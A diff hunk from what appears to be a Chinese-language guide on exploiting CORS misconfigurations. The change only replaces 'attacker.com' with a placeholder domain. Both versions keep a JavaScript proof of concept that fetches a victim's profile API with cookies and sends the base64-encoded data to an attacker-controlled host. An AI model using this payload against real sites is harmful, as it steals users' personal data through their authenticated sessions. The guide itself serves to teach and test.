@@ -50,13 +50,13 @@ def check_cors(target: str, endpoint: str = "/api/me"):
 ### Level 1 Exploit
 
 ```html
-<!-- 托管在 attacker.com -->
+<!-- 托管在 <attacker-domain> -->
 <script>
 fetch('https://target.com/api/user/profile', {
     credentials: 'include'  // 带 cookie
 })
 .then(r => r.json())
-.then(data => fetch('https://attacker.com/log?d=' + btoa(JSON.stringify(data))));
+.then(data => fetch('https://<attacker-domain>/log?d=' + btoa(JSON.stringify(data))));
 </script>
 ```
 
